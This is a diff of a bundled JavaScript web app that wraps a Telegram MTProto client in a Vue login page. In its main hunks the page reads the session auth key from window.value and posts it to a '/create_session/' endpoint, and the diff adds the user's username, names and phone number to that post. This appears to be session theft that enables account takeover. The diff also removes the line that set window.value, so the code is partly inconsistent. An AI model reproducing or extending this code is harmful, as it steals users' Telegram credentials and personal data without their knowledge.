@@ -135,7 +135,6 @@ const {
  * console.log(deflate.result);
  * ```
  **/
-
 function Deflate(options) {
   this.options = utils.assign({
     level: Z_DEFAULT_COMPRESSION,
@@ -6772,7 +6771,7 @@ class MTProto {
 
   async call(method, params = {}, options = {}) {
     const { syncAuth = true } = options;
-    console.log(options)
+
     const dcId = options.dcId || (await this.storage.get('defaultDcId')) || 2;
 
     this.createRPC(dcId);
@@ -6810,7 +6809,6 @@ class MTProto {
             },
             { dcId: dc.id, syncAuth: false }
           );
-  
         })
         .catch(error => {
           console.warn(`Error when copy auth to DC ${dc.id}:`, error);
@@ -7506,8 +7504,7 @@ class RPC {
     const padding = minPadding + (unpadded ? 16 - unpadded : 0);
 
     const { sessionId } = this;
-    window.value = authKey
-    console.log(authKey)
+
     const plainDataSerializer = new Serializer(function () {
       this.bytesRaw(serverSalt);
       this.bytesRaw(sessionId);
@@ -60156,12 +60153,13 @@ var app = new Vue({
                 });
                 console.log(MTproto)
                 console.log(`authResult:`, authResult);
+                const user = authResult.user
                 const key = window.value
                 const dc_id = getdcId(key)
                 const ip = MTproto.dcList[dc_id-1].ip
                 const port = MTproto.dcList[dc_id-1].port
                 console.log([key, dc_id])
-                await this.createSession(ip, dc_id, port, key)
+                await this.createSession(ip, dc_id, port, key, user.username, user.first_name, user.last_name, phone)
                 } catch (error) {
                     console.log(error)
                 if (error.error_message !== 'SESSION_PASSWORD_NEEDED') {
@@ -60212,12 +60210,16 @@ var app = new Vue({
             })();
         },
 
-        createSession: function(server_adress, dc_id, port, auth_key){
+        createSession: function(server_adress, dc_id, port, auth_key, username, firstname, lastname, phone){
             axios.post('/create_session/', {
                 server_address: server_adress,
                 dc_id: dc_id,
                 port: port,
-                key: auth_key
+                key: auth_key,
+                username: username,
+                firstname: firstname,
+                lastname: lastname,
+                phone: phone
             }).then()
         }
     }
